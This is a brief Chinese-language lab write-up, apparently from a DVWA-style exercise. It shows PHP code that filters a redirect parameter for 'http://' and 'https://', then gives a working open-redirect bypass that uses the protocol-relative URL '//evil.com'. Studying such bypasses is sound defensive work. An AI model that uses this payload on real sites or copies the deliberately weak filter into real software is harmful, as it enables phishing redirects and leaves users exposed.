## 源码

```php
if (preg_match("/http:\/\/|https:\/\//i", $_GET['redirect'])) {
    exit;  // 拦截绝对 URL
}
header("location: " . $_GET['redirect']);
```

## 绕过

`//evil.com` 是协议相对 URL——浏览器自动补全 `https://`，但正则里没有 `//`。

```
/source/medium.php?redirect=//evil.com
```
